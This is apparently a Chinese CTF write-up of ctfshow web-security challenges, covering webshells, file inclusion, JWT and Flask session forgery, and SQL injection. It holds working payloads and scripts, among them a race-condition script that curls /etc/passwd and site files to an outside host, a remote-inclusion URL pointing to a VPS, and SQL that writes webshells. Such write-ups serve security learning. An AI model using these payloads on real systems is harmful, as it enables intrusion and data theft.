---
title: ctfshow-Web应用安全与防护
published: 2025-09-15
pubDate: 2025-09-15
description: Web应用安全与防护 wp
pinned: false
tags: ['web']
author: zsm
category: CTF-web
draft: false 
licenseName: "MIT"
lang: 'zh_CN'
---

# 第一章

## Base64编码隐藏 

源码

> const correctPassword = "Q1RGe2Vhc3lfYmFzZTY0fQ==";

base64解码即可

## HTTP头注入

直接输入密码提示`You must use "ctf-show-brower" browser to access this page`  

改UA头

## Base64多层嵌套解码 

加密逻辑

```js
<script>

document.getElementById('loginForm').addEventListener('submit', function(e) {

const correctPassword = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=";

function validatePassword(input) {

let encoded = btoa(input);

encoded = btoa(encoded + 'xH7jK').slice(3);

encoded = btoa(encoded.split('').reverse().join(''));

encoded = btoa('aB3' + encoded + 'qW9').substr(2);

return btoa(encoded) === correctPassword;

}

const enteredPassword = document.getElementById('password').value;

const messageElement = document.getElementById('message');

if (!validatePassword(enteredPassword)) {

e.preventDefault();

messageElement.textContent = "Login failed! Incorrect password.";

messageElement.className = "message error";

}

});

</script>
```

写脚本写了一会

```python
import base64


def validate_password(input_str):
    correct_password = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU="
    encoded = base64.b64encode(input_str.encode()).decode()
    encoded = base64.b64encode((encoded + 'xH7jK').encode()).decode()[3:]
    encoded = base64.b64encode(''.join(reversed(encoded)).encode()).decode()
    encoded = base64.b64encode(('aB3' + encoded + 'qW9').encode()).decode()[2:]
    return base64.b64encode(encoded.encode()).decode() == correct_password


def find_password():
    correct_password = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU="
    step4 = base64.b64decode(correct_password).decode()
    
    import string
    chars = string.ascii_letters + string.digits + '+/='
    
    for c1 in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        for c2 in chars:
            try:
                full_step4 = c1 + c2 + step4
                while len(full_step4) % 4 != 0:
                    full_step4 += '='
                
                decoded = base64.b64decode(full_step4).decode()
                if decoded.startswith('aB3') and decoded.endswith('qW9'):
                    step3 = decoded[3:-3]
                    
                    step2_rev = base64.b64decode(step3).decode()
                    step2 = ''.join(reversed(step2_rev))
                    
                    for d1 in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                        for d2 in chars:
                            for d3 in chars:
                                try:
                                    full_step2 = d1 + d2 + d3 + step2
                                    while len(full_step2) % 4 != 0:
                                        full_step2 += '='
                                    
                                    decoded2 = base64.b64decode(full_step2).decode()
                                    if decoded2.endswith('xH7jK'):
                                        step1 = decoded2[:-5]
                                        
                                        try:
                                            while len(step1) % 4 != 0:
                                                step1 += '='
                                            original = base64.b64decode(step1).decode()
                                            
                                            # 验证密码
                                            if validate_password(original):
                                                return original
                                        except:
                                            continue
                                except:
                                    continue
            except:
                continue
    
    return None

result = find_password()
if result:
    print(f"找到密码: {result}")
else:
    print("未找到密码")
```

然后发过去，顺便改ua头

## HTTPS中间人攻击 

有两个文件，一个流量包一个`.log`文件  

发现TLS和TCP的内容都被加密了，把log文件配置到小鲨鱼里面，就会多出来两个流，得到flag

## Cookie伪造 

先上去要登陆，密码是`guest`，如何cookie里面改一下刷新就行了

# 第二章

## 一句话木马变形

可以执行命令，`phpinfo();`没有flag  

`system(ls);`得到回显

```
<br />
<b>Warning</b>:  Use of undefined constant ls - assumed 'ls' (this will throw an Error in a future version of PHP) in <b>/var/www/html/index.php(107) : eval()'d code</b> on line <b>1</b><br />
flag.php
index.php 
```

尝试直接读取不行

```
Error: Invalid characters detected! Only letters, numbers, underscores ,parentheses and semicolons are allowed.
```

无参rce读取

> readfile(next(array_reverse(scandir(getcwd()))));

## 反弹shell构造 

执行ls没有效果，nc弹shell即可

## 管道符绕过过滤 

直接执行，可以看见flag.php，这里管道符直接执行

> |cat flag.php 

## 无字母数字代码执行 

打取反绕过

> (~%8F%97%8F%96%91%99%90)();

bp传过去发现成功执行，

```php
<?php
var_dump(urlencode(~'system'));
var_dump(urlencode(~'cat flag.php'));
?>
```

> (~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);

## 无字母数字命令执行 

一个很奇怪的题，本来想着利用工具去试试，发现无回显  

这里尝试弹shell，传上去的文件是空的，不知道为什么。

这里使用了linux下`. file`执行文件内容的特性

由于不确定seesion文件路径，写个脚本去爆，这里直接拿别人的用了

```python
import requests
import threading
import time
import signal
import sys

# 靶机链接
url = 'http://a9dbdc84-611d-455a-9f9e-c7b8dc599cdf.challenge.ctf.show/'
shell_url = url + "44.txt"
sessionid = 'cnmusa'

data = {
    'PHP_SESSION_UPLOAD_PROGRESS': 'ls > 44.txt;curl -X POST http://219tzymz.eyes.sh -d "1=`cat /etc/passwd;cat /var/www/html/*;cat /f*`"',
}

file = {
    'file': sessionid
}

cookies = {
    'PHPSESSID': sessionid
}

# 常见 session 文件路径列表
# session_paths = [
#     f"/var/lib/php/sess_{sessionid}",
#     f"/var/lib/php/sessions/sess_{sessionid}",
#     f"/tmp/sess_{sessionid}",
#     f"/tmp/sessions/sess_{sessionid}"
# ]
str_len = len(sessionid)
payload = "?"*str_len
session_paths = [
    f". /???/???/???/????_{payload}",
    f". /???/???/???/????????/????_{payload}",
    f". /???/????_{payload}",
    f". /???/????????/????_{payload}"
]

# 全局停止事件
stop_event = threading.Event()

def upload_file():
    while not stop_event.is_set():
        try:
            requests.post(url, data=data, files=file, cookies=cookies, timeout=3)
        except requests.RequestException:
            pass
        # time.sleep(1)

def check_file():
    while not stop_event.is_set():
        try:
            # 尝试所有常见 session 文件路径
            for path in session_paths:
                print(f"Trying path: {path}")
                requests.post(url, data={"code": path}, timeout=3)

            r = requests.get(shell_url, timeout=3)
            if r.status_code == 200:
                print('Webshell created successfully')
                print(r.text)
                stop_event.set()  # 文件创建成功，通知所有线程退出
                break
            else:
                print(f"{r.status_code}")
        except requests.RequestException:
            pass
        # time.sleep(1)

# Ctrl+C 捕获处理
def signal_handler(sig, frame):
    print("\nCtrl+C 捕获，正在退出...")
    stop_event.set()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# 启动线程
threads = []
for _ in range(5):
    t = threading.Thread(target=upload_file, daemon=True)
    t.start()
    threads.append(t)

for _ in range(15):
    t = threading.Thread(target=check_file, daemon=True)
    t.start()
    threads.append(t)

# 主线程等待事件
try:
    while not stop_event.is_set():
        time.sleep(0.5)
except KeyboardInterrupt:
    stop_event.set()

for t in threads:
    t.join()

```
# 第三章


## 日志文件包含 

文件包含加上ua头bro，nginx的日志路径是`/var/log/nginx/access.log`  

先GET传个ua头的马上去`<?php eval($_GET['cmd']); ?>`，然后post拿flag,`/?cmd=system('cat%20flag.php');`

##  php://filter读取源码

先读源码`php://filter/convert.base64-encode/resource=index.php`，有个`db.php`，继续读`php://filter/convert.base64-encode/resource=db.php`，拿到flag

## 远程文件包含（RFI）

vps起个python服务，让靶机下个马，然后读flag

> https://f5c7f449-1057-46e6-b493-f2217cb1f51a.challenge.ctf.show/?path=http://121.41.100.198:9001/1.txt&1=system(%27tac%20f*%27);

## 路径遍历突破 

先看看源码，输入`index.php`即可

核心代码

```php
<?php

if (isset($_GET['path']) && $_GET['path'] !== '') {
$path = $_GET['path'];
if(preg_match('/data|log|access|pear|tmp|zlib|filter|:/', $path) ){
echo '<span style="color:#f00;">禁止访问敏感目录或文件</span>';
exit;
}

#禁止以/或者../开头的文件名
if(preg_match('/^(\.|\/)/', $path)){
echo '<span style="color:#f00;">禁止以/或者../开头的文件名</span>';
exit;
}

echo $path."内容为：\n";
echo str_replace("\n", "<br>", htmlspecialchars(file_get_contents($path)));
} else {
echo '<span style="color:#888;">目标flag文件为/flag.txt</span>';
}
?>
```

目录穿越，不能../开头，加个不存在的开头`zsm/../../../../../../../../flag.txt`

## 临时文件包含 

这个脚本一把梭哈

```python
import io
import threading

import requests

# 如果题目链接是https，换成http
url = 'http://2f6bf14f-8f83-463c-9bc4-c12112acacc0.challenge.ctf.show/'
sessionid = 'ctfshow'

def write(session): # 写入临时文件
    while True:
        fileBytes = io.BytesIO(b'a'*1024*50) # 50kb
        session.post(url,
        cookies = {'PHPSESSID':sessionid},
        data = {'PHP_SESSION_UPLOAD_PROGRESS':'<?php file_put_contents("shell.php","<?php highlight_file(__FILE__);eval(\$_GET[1]);?>");?>'},
        files={'file':('1.jpg',fileBytes)}
        )

def read(session):
    while True:
        session.get(url + '?path=/tmp/sess_' + sessionid) # 进行文件包含
        r = session.get(url+'shell.php') # 检查是否写入一句话木马
        if r.status_code == 200:
            print('OK')
            return ''

evnet=threading.Event() # 多线程

session = requests.session()
for i in range(20):
    threading.Thread(target = write,args = (session,)).start()
for i in range(20):
    threading.Thread(target = read,args = (session,)).start()

evnet.set()
```

本质是条件竞争？

# 第四章

## Session固定攻击 

登陆上去，然后发送信息，回去刷新一下就行了

## JWT令牌伪造 

随便一个id拿到jwt，网上解析一下，伪造成none.

```python
import base64
import json


def b64url_encode(data: bytes) -> str:
    """Base64 URL-safe 编码，去掉填充 ="""
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

# Header: alg=none
header = {"alg": "none", "typ": "JWT"}
payload = {"user": 'admin', "admin": "false"}  # 你要伪造的用户数据

# 分别编码
header_b64 = b64url_encode(json.dumps(header).encode())
payload_b64 = b64url_encode(json.dumps(payload).encode())

# 拼接 JWT，签名为空
jwt = f"{header_b64}.{payload_b64}."

print("伪造的 JWT:")
print(jwt)

```

## Flask_Session伪造 

点进去说什么爬虫，点链接，url`https://71821fb8-a919-4c24-99b8-6a4b34764937.challenge.ctf.show/read?url=https://baidu.com`，这个就很抽象  

尝试伪协议读取,`file:///etc/passwd`，尝试读取源码，flask在`app/app.py`,

```python
# encoding:utf-8
import re
import random
import uuid
import urllib.request
from flask import Flask, session, request

app = Flask(__name__)

# 随机生成一个 SECRET_KEY
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random() * 100)
print(app.config['SECRET_KEY'])

app.debug = False


@app.route('/')
def index():
    session['username'] = 'guest'
    return 'CTFshow 网页爬虫系统 读取网页'


@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        if re.findall('flag', url, re.IGNORECASE):
            return '禁止访问'
        res = urllib.request.urlopen(url)
        return res.read().decode('utf-8', errors='ignore')
    except Exception as ex:
        print(str(ex))
        return '无读取内容可以展示'


@app.route('/flag')
def flag():
    if session.get('username') == 'admin':
        return open('/flag.txt', encoding='utf-8').read()
    else:
        return '访问受限'


if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0")
```

这里不允许url出现flag，那就无法直接读取了，查了一下，下面我们要伪造flask的session。  

这里需要key，key可以通过mac地址读取。`read?url=file:///sys/class/net/eth0/address`.  

```python
import random

mac = int("02:42:ac:0c:25:31".replace(":",""),16) # 已知的 MAC 地址
random.seed(mac)
key = str(random.random()*100)
print(key)
```

```
python flask_session_cookie_manager3.py decode -s "21.01424233154766" -c "eyJ1c2VybmFtZSI6Imd1ZXN0In0.aL-HZA.tqjnrSZ96pGMJkqtzPEeTCkWXwc"

{'username': 'guest'}

python flask_session_cookie_manager3.py encode -s "21.01424233154766" -t "{'username':'admin'}"

eyJ1c2VybmFtZSI6ImFkbWluIn0.aL-MLQ.uNkIc07sRnDEAULn6-_KJiZ5nb0
```
替换拿flag即可


## 弱口令爆破 

爆破即可


# 第五章

## 联合查询注入 

尝试sqlmap，
```
sqlmap -u "https://61847c0f-54cb-4da6-8115-a43decc745a3.challenge.ctf.show/?id=4" -p id --dbs --batch
sqlmap -u "https://61847c0f-54cb-4da6-8115-a43decc745a3.challenge.ctf.show/?id=4" -p id -D ctfshow_page_informations --tables --batch 
sqlmap -u "https://61847c0f-54cb-4da6-8115-a43decc745a3.challenge.ctf.show/?id=4" -p id -D ctfshow_page_informations -T users --dump --batch
```

## 布尔盲注爆破 

用户名和密码都可以注入，联合查询写入webshell，

>password=1' union select 1,2,3,'<?php eval($_POST[1]);?>' into outfile'/var/www/html/1.php'%23&username=1

蚁剑连接上去，`conn.php`里面有数据库连接密码，连接上去，然后拿flag

## 堆叠注入写Shell 

bp里面fuzz字典跑一下，发现用户名是`\`的响应不一样，尝试密码去注入`or 1=1#`，成功登陆，再继续尝试sleep发现有效果。  

尝试写马，发现他把单引号ban了，双引号继续写入就行了，flag在根目录

## WAF绕过

不知道waf了什么，还是继续写马，phpinfo可以直接写入

